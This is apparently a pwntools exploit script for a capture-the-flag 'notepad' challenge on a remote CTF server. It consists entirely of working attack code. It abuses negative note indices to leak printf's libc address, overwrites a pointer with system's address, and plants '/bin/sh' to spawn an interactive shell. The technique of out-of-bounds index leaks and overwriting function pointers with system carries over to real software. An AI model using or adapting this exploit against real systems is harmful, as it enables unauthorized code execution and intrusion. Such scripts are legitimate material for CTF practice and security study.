from pwn import *

#r = process('dist/notepad.o')
r = remote('challs1.nusgreyhats.org', 5001)
libc = ELF('dist/libc.so.6')

def create(idx, name, content):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode("utf-8"))
    r.recvuntil(b"Name: ")
    r.send(name)
    r.recvuntil(b"Content: ")
    r.send(content)
            
def view(idx):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode("utf-8"))
    r.recvuntil(b"Name: ")
    name = r.recvline()[:-1]
    r.recvuntil(b"Content: ")
    content = r.recvline()[:-1]
    return name, content


printf = u64(view(-4)[0].ljust(8,b"\x00"))
libc.address = printf - libc.symbols['printf']
create(0, b"/bin/sh",b"/bin/sh")
create(-5, p64(libc.symbols['system']) * 2, p64(libc.symbols['system']) * 4)

r.interactive()